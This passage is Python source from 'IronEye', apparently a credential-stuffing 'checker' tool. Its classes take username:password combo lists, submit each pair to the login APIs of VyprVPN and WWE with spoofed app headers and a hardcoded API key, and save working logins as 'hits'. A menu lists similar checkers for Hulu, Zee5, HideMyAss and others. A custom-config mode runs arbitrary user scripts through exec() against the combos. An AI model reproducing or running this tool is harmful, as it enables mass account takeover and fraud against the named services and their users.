            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r', encoding="UTF-8").readlines()
        self.combos: int = self.data.count(':')
        for i in self.data:
            self._checker(i=i)
            self.display()

    def _checker(self, i):
        try:
            self.headers = {
                "User-Agent": "okhttp\\/2.3.0",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "username": i.split(':')[0],
                "password": i.split(':')[1],
                "X-GF-Agent": "VyprVPN Android v2.19.0.7702. (56aa5dfd)",
                "X-GF-PRODUCT": "VyprVPN",
                "X-GF-PRODUCT-VERSION": "2.19.0.7702",
                "X-GF-PLATFORM": "Android",
                "X-GF-PLATFORM-VERSION": "6.0"
            }
        except IndexError:
            self.checked.append(i)
            self.failed.append(i)
            return
        try:
            self.response = str(get(url=self.url, headers=self.headers).text)
            if 'account_level' in self.response:
                self.checked.append(i)
                self.hits.append(i)
                self._saver(i=i)
            else:
                self.checked.append(i)
                self.failed.append(i)
                return None
        except Exception as error:
            logger.error(area='VyprVpn._checker', log=str(error))

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print("__     __\n"
              "\\ \\   / / _   _  _ __   _ __\n"
              " \\ \\ / / | | | || '_ \\ | '__|\n"
              "  \\ V /  | |_| || |_) || |\n"
              "   \\_/    \\__, || .__/ |_|\n"
              "          |___/ |_|\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : VyprVPN_Hits.ir")
        print(r"Tool And Checker By : @AKASH_AM1")
        print(r"Tool Channel : @IndianBots")

    def _saver(self, i):
        self.save_file = open("VyprVPN_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class WWEChecker:
    def __init__(self):
        self.url: str = "https://dce-frontoffice.imggaming.com/api/v2/login"
        self.checked = []
        self.hits = []
        self.failed = []
        try:
            self.file: str = input("Combos File : ")
        except KeyboardInterrupt:
            pass
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print("__        ____        __ _____\n"
              r"\ \      / /\ \      / /| ____|" + '\n'
              r" \ \ /\ / /  \ \ /\ / / |  _|" + '\n'
              r"  \ V  V /    \ V  V /  | |___" + '\n'
              r"   \_/\_/      \_/\_/   |_____|" + '\n')
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : WWE_Hits.txt")
        print(f"Checker By : @AKASH_AM1")

    def _checker(self, i):
        self.headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en;q=0.9",
            "app": "dice",
            "content-type": "application/json",
            "origin": "https://watch.wwe.com",
            "realm": "dce.wwe",
            "referer": "https://watch.wwe.com/",
            "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "ross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/87.0.4280.88 Safari/537.36",
            "x-api-key": "cca51ea0-7837-40df-a055-75eb6347b2e7"
        }
        try:
            self.post_data = '{"id" : "' + i.split(":")[0] + '", "secret": "' + i.split(":")[1] + '"}'
            self.req = post(url=self.url, data=self.post_data, headers=self.headers).text
            if "authorisationtoken" in self.req.lower():
                self.checked.append(i)
                self.hits.append(i)
                self._saver(i=i)
            else:
                self.checked.append(i)
                self.failed.append(i)
                return None
        except Exception as error:
            logger.error(area='WWEChecker._checker', log=str(error))
            pass

    def _saver(self, i):
        self.save_file = open("WWE_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class CustomConfig(object):
    def __init__(self):
        self.start = time.time()
        self.checked = []
        self.hits = []
        self.failed = []
        self.thread1 = Thread(target=self.loading)
        self.thread1.start()
        self.thread1.join()
        self.__main__()

    def __main__(self):
        print(f"{Fore.BLUE}Welcome To IronEye Custom Config !{Fore.RESET}")
        time.sleep(3)
        try:
            self.config: str = input(f"{Fore.CYAN}Config File:   IronEye/{Fore.RESET}")
            if not os.path.exists(f'./{self.config}') or self.config == '' or self.config == '.':
                print(f'{Fore.RED}No Such File Exists !{Fore.RESET}')
                time.sleep(3)
                os.system('cls' if platform.system() == 'Windows' else 'clear')
                banner()
                CustomConfig()
            else:
                ConfigAnalyzer(file=self.config, task='analyzeConfig')
                time.sleep(7)
                pass
            self.file: str = input(f"{Fore.CYAN}Combos File:   IronEye/{Fore.RESET}")
            if not os.path.exists(f'{self.file}') or self.file == '' or self.file == '.':
                print(f'{Fore.RED}No Such File Exists !{Fore.RESET}')
                time.sleep(3)
                os.system('cls' if platform.system() == 'Windows' else 'clear')
                banner()
                CustomConfig()
            for i in open(file=self.file, mode='rt').readlines():
                try:
                    _ = i.split(':')[0]
                    _ = i.split(':')[1]
                except Exception as error:
                    logger.error(area='CustomConfig.ComboFileCheck', log=str(error))
                    print(f'Invalid Combos File. {Fore.RESET}')
                    exit(1)
            print(f'{Back.RED}{Fore.CYAN}{Style.BRIGHT}[WARNING]{Style.NORMAL}{Fore.RESET}{Back.RESET}\n'
                  f'    {Back.RED}{Fore.GREEN}DDOS Attack on sites that you don\'t own is illegal,{Back.RESET}\n'
                  f'    {Back.RED}IronEye will not be help responsible for any loss,{Back.RESET}\n'
                  f'    {Back.RED}Are you sure you want to continue \\?'
                  f'{Fore.RESET}{Back.RESET}')
            query = input(f'Continue batch job (Y/N)? {Fore.RESET}')
            if query.lower() == 'y':
                self._run()
            else:
                exit(2)
        except KeyboardInterrupt:
            input(f'Terminate batch job (Y/N)? {Fore.RESET}')
            exit(7)

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(f'Name : {self.irSettingsJson["Name"]}')
        print(f'ConfigVersion : {self.irSettingsJson["ConfigVersion"]}')
        print(f'IrVersion : {self.irSettingsJson["IrVersion"]}')
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(fr"Hits Saved To : ./HitsDB/{self.irSettingsJson['HitsFileName']}.ir")
        print(f"Checker By : {self.irSettingsJson['Author']}")

    def _run(self):
        self.configAnalyzer = ConfigAnalyzer(file=self.config, task='runCustomConfig')
        time.sleep(7)
        self.irScript = self.configAnalyzer.irScript
        self.irSettingsJson = self.configAnalyzer.irSettingsJson
        self.file = open(file=self.file, mode="rt", encoding='utf-8')
        self.data = self.file.read()
        self.combos = self.data.count(':')
        for i in self.data.splitlines():
            try:
                self.runThread = Thread(
                    target=exec(self.irScript.replace('$LOGIN', i.split(':')[0]).replace("$SECRET", i.split(':')[1]))
                )
                self.runThread.start()
                self.runThread.join(timeout=60)
                self.display()
            except Exception as error:
                logger.error(area='CustomConfig._run', log=str(error))
                self.display()

    def loading(self):
        try:
            for _ in range(25):
                for i in ['⋯', '⋱', '⋮', '⋰']:
                    print(f"{Fore.RESET}Running IronEye Task 'createSafeEnvironment'...                ",
                          end=f'{Fore.BLUE}{i}{Fore.RESET}\r')
                    time.sleep(c([0.1, 0.2, 0.3, 0.05]))
            print(f"Running IronEye Task 'createSafeEnvironment'...                {Fore.GREEN}Done.{Fore.RESET}")
            time.sleep(3.5)
            print(f"Running IronEye Task 'createSafeEnvironment'...                "
                  f"{Fore.GREEN}{time.time() - self.start:.2f}s{Fore.RESET}")
        except KeyboardInterrupt:
            input(f'Terminate batch job (Y/N)? {Fore.RESET}')
            exit(7)


# I Love Clean Coding, So Class :happy:
class ConfigAnalyzer:
    def __init__(self, file: str, task: str):
        self.start = time.time()
        self.file = file
        self.task = task
        self.log = ''
        self.hits = []
        self.checked = []
        self.failed = []
        self.thread1 = Thread(target=self._analyzeConfig)
        self.thread2 = Thread(target=self.loading)
        self.thread1.start()
        self.thread1.join(timeout=60)

    def _analyzeConfig(self):
        self.thread2.start()
        self.data = open(file=self.file, mode='r', encoding='utf-8').read()
        if '[IrSettings]' not in self.data or '[IrScript]' not in self.data:
            self.log = f"[ConfigAnalyzer]\nInvalid Config"
            logger.error(area='ConfigAnalyzer', log="Invalid Config")
            self.result = False
            return
        self.irSettings = self.data.split('\n\n\n')[0].removeprefix('[IrSettings]')
        self.irScript = self.data.split('\n\n\n')[1].removeprefix('[IrScript]')
        # For [IrSettings]
        try:
            self.irSettingsJson = json.loads(self.irSettings)
            assert self.irSettingsJson['Name'] != ''
            assert self.irSettingsJson['Author'] != ''
            assert self.irSettingsJson['AdditionalInfo'] != ''
            assert self.irSettingsJson['IrVersion'] != ''
            assert self.irSettingsJson['ConfigVersion'] != ''
            assert self.irSettingsJson['AllowedWordlist'] != ''
            assert self.irSettingsJson['SaveHits'] != ''
            assert str(self.irSettingsJson['IrVersion']).split(' ')[0] == __version__
            for i in ['/', '\\', '"', "'", ":", ">", "<", "*", "?", "|"]:
                assert i not in self.irSettingsJson['HitsFileName']
            self.result = True
        except Exception as error:
            self.log = f"[ConfigAnalyzer.irSettingsJson]\n{error}"
            logger.error(area='ConfigAnalyzer.irSettingsJson', log=str(error))
            self.result = False
        # For [IrScript]
        try:
            logger.info(area='ConfigAnalyzer.IrScript', log="Executing IrScript.")
            LOGIN = 'xyz@xyz.xom'
            SECRET = 'xyz'
            try:
                try:
                    testThread = Thread(target=exec(self.irScript.replace('$LOGIN', LOGIN).replace("$SECRET", SECRET)))
                    testThread.start()
                    testThread.join(timeout=17)
                    logger.info(area='ConfigAnalyzer.IrScript', log="Executing IrScript - Successfully")
                    self.result2 = True
                except Exception as error:
                    self.log = f"[ConfigAnalyzer.IrScript.Run]\n{error}"
                    logger.warn(area='ConfigAnalyzer.IrScript.Run', log=str(error))
                    self.result2 = False
            except Exception as error:
                self.log = f"[ConfigAnalyzer.IrScript.Import]\n{error}"
                logger.error(area='ConfigAnalyzer.IrScript.Import', log=str(error))
                self.result2 = False
        except Exception as error:
            self.log = f"[ConfigAnalyzer.IrScript]\n{error}"
            logger.error(area='ConfigAnalyzer.IrScript', log=str(error))
            self.result2 = False

    def loading(self):
        while self.thread1.is_alive():
            for i in ['-', '\\', '|', '/']:
                print(f"{Fore.RESET}Running IronEye task '{self.task}'...\t  ", end=f'{Fore.CYAN}{i}\r')
                time.sleep(0.1)
        if self.result and self.result2:
            sys.stdout.flush()
            print(f"{Fore.RESET}Running IronEye task '{self.task}'...\t  {Fore.GREEN}Done.{Fore.RESET}")
            time.sleep(3)
            print(f"Running IronEye task '{self.task}'...\t  "
                  f"{Fore.GREEN}{time.time() - self.start:.2f}s{Fore.RESET}")
        if not self.result or not self.result2:
            sys.stdout.flush()
            print(f"{Fore.RESET}Running IronEye task '{self.task}'...\t  {Fore.GREEN}Done.{Fore.RESET}")
            time.sleep(3)
            print(f"Running IronEye task '{self.task}'...\t  {Fore.RED}{time.time() - self.start:.2f}s{Fore.RESET}")
            print(f"{Fore.RED}What Went Wrong :{Fore.RESET}")
            for i in self.log.splitlines():
                print(f"\t{Fore.RED}{i}{Fore.RESET}")
            exit(3)


# I Love Clean Coding, So Class :happy:
class LogManager:
    def __init__(self):
        self.logs = os.listdir('./Logs/')
        print(
            "Welcome To IronEye Log Management\n"
            f"Manage Logs Without {Fore.RED}Manual {Fore.CYAN}Efforts{Fore.RESET} !\n"
            f"\n"
            f"{Fore.CYAN}[{Fore.RED}1{Fore.CYAN}]{Fore.RESET} Delete Logs\n"
            f"{Fore.CYAN}[{Fore.RED}2{Fore.CYAN}]{Fore.RESET} Send Logs To \"{Fore.CYAN}t.me/AKASH_AM1{Fore.RESET}\"\n"
        )
        query = input(
            'Choose Batch Job (1/2)? '
        ).lower()
        if query == '1':
            sys.exit(os.system('ironeye clogs'))
        elif query == '2':
            try:
                from telethon import TelegramClient
                self.uploadLogsToTelegram(self=self)
            except ImportError:
                print('Cannot Find "Telethon" In Your Python Path.')
                exit(7)
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            banner()
            LogManager()

    @staticmethod
    def uploadLogsToTelegram(self):
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        appId = input(f'{Fore.CYAN}Enter AppId ? {Fore.RESET}')
        if not appId.isdigit():
            print(f"{Fore.RED}Invalid Session String...{Fore.RESET}")
            logger.error(area='LogManager.uploadLogsToTelegram', log='Invalid appId')
            exit(7)
        appHash = input(f'{Fore.CYAN}Enter AppHash ? {Fore.RESET}')
        if not appHash.isalnum():
            print(f"{Fore.RED}Invalid Session String...{Fore.RESET}")
            logger.error(area='LogManager.uploadLogsToTelegram', log='Invalid appHash')
            exit(7)
        sessionString = input(f'{Fore.CYAN}Enter Session String ? {Fore.RESET}')
        if not sessionString.endswith('='):
            print(f"{Fore.RED}Invalid Session String...{Fore.RESET}")
            logger.error(area='LogManager.uploadLogsToTelegram', log='Invalid Session String')
            exit(7)
        try:
            self.bot = TelegramClient(StringSession(sessionString), appId, appHash).start()
            files = []
            _num = 0
            for i in os.listdir('./Logs/'):
                file = open(file=i, mode='r')
                fileData = file.read()
                file.close()
                if fileData.strip() == '':
                    pass
                else:
                    files.append((file, _num))
                    _num += 1
            for file in files:
                print(f"[ {Fore.RED} {file[0]}{Fore.GREEN} ]  - {file[1]}{Fore.RESET}")
            filesToSend = input(f'{Fore.CYAN}Choose Files To Send (Separate With <SPACE>)? {Fore.RESET}')
            for i in filesToSend.split(" "):
                if not i.strip().isdigit() and i > len(files):
                    print(f'{Fore.RED}Invalid Option \'{i}\'{Fore.RESET}')
                    exit(3)
            # User: ME
            userThread = Thread(target=self.__await_tasks__)
            userThread.start()
            userThread.join()
            # uploadingFiles
            if self.user:
                for i in filesToSend.split(" "):
                    try:
                        self.bot.send_file(
                            entity='AKASH_AM1',
                            file=f'./Logs/{i}',
                            caption=f"[{self.user.first_name} {self.user.last_name}](t.me/{self.user.username})",
                        )
                    except Exception as error:
                        logger.error(area='LogManager.uploadLogsToTelegram', log=str(error))
                        print(
                            f'{Fore.RED}Error{Fore.RESET} Occurred While Uploading "{Fore.CYAN}./Logs/{i}{Fore.RESET}"'
                        )
            else:
                logger.error(area='LogManager.uploadLogsToTelegram', log='self.user != !None')
                print(f'{Fore.RED}Error{Fore.RESET} Occurred While Getting User Information')
        except Exception as error:
            logger.error(area='LogManager.uploadLogsToTelegram', log=str(error))
            print(f"{Fore.RED}Please Provide Right Information...{Fore.RESET}")
            exit(7)
        pass

    async def __await_tasks__(self):
        try:
            self.user = await self.bot.get_me()
            print(
                f"Welcome {self.user.first_name}\n"
                f"FullName • {self.user.first_name} {self.user.last_name}\n"
                f"UserName • {Fore.CYAN}@{self.user.username}{Fore.RESET}\n"
                f"Id • {Fore.GREEN}{self.user.id}{Fore.RESET}\n"
                f"Phone • {Fore.YELLOW}{self.user.phone}{Fore.RESET}\n"
                f"\n"
                f"Thanks For Using {Fore.CYAN}IronEye{Fore.RESET}."
            )
        except Exception as error:
            logger.error(area='LogManager.__await__', log=str(error))
            self.user = None


def main():
    modes = (f"{Fore.GREEN}"
             f"[ {Fore.RED} 1{Fore.GREEN} ]  - Hulu Checker\n"
             f"[ {Fore.RED} 2{Fore.GREEN} ]  - FreeKaMaal Checker\n"
             f"[ {Fore.RED} 3{Fore.GREEN} ]  - Zee5 Checker\n"
             f"[ {Fore.RED} 4{Fore.GREEN} ]  - AltBalaji Checker\n"
             f"[ {Fore.RED} 5{Fore.GREEN} ]  - Proxy Checker\n"
             f"[ {Fore.RED} 6{Fore.GREEN} ]  - Aha Checker\n"
             f"[ {Fore.RED} 7{Fore.GREEN} ]  - FreshTools.Net Checker\n"
             f"[ {Fore.RED} 8{Fore.GREEN} ]  - HideMyAss Checker\n"
             f"[ {Fore.RED} 9{Fore.GREEN} ]  - CryptoAd Checker\n"
             f"[ {Fore.RED}10{Fore.GREEN} ]  - McMx Checker\n"
             f"[ {Fore.RED}11{Fore.GREEN} ]  - VyprVpn Checker\n"
             f"[ {Fore.RED}12{Fore.GREEN} ]  - Custom Config\n"
             f"[ {Fore.RED}13{Fore.GREEN} ]  - Log Management\n"
             f"[ {Fore.RED}14{Fore.GREEN} ]  - Exit{Fore.RESET}")
    print(modes)
    try:
        response: str = input(f"{Fore.CYAN}Choose Any One Option To Proceed : {Fore.RESET}")
    except KeyboardInterrupt:
        response = ''
        input(f'Terminate batch job (Y/N)? {Fore.RESET}')
        exit(7)
    if response == '1':
        print("Starting The Hulu Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        Hulu()
    elif response == '2':
        print("Starting The FreeKaMaal Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        FreeKaMaal()
    elif response == '3':
        print("Starting The Zee5 Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        Zee5Checker()
    elif response == '4':
        print("Starting The AltBalaji Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        AltBalajiChecker()
    elif response == '5':
        print("Starting The Proxy Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        ProxyChecker()
    elif response == '6':
        print("Starting The Aha Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        Aha()
    elif response == '7':
        print("Starting FreshTools.NET Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        FreshToolsChecker()
    elif response == '8':
        print("Starting The HideMyAssChecker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        HideMyAssChecker()
    elif response == '9':
        print("Starting The Crypto.Ad Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        CryptoAd_Checker()
    elif response == '10':
        print("Starting The McMx Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        McmxChecker()
    elif response == '11':
        print("Starting The VyprVpn Checker")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        VyprVpn()
    elif response == '12':
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        CustomConfig()
    elif response == '13':
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        LogManager()
    elif response == '14':
        print(f"Ok, IronEye Will Exit Now...{Fore.RESET}")
        exit(69)
    else:
        print("You Have Selected An Unknown Option.\n"
              "Please Retry In 3 Seconds")
        time.sleep(2)
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        banner()
        main()


if __name__ == '__main__':
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    if platform.python_version() != '3.9.7':
        logger.error(area='IronEye.__main__', log=f"Python Version Is {platform.python_version()}")
        print(f'{Fore.RED}Python [{platform.python_version()}]{Fore.RESET} is not supported.\n'
              f'Please upgrade to latest version.')
        exit(0)
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    banner()
    main()
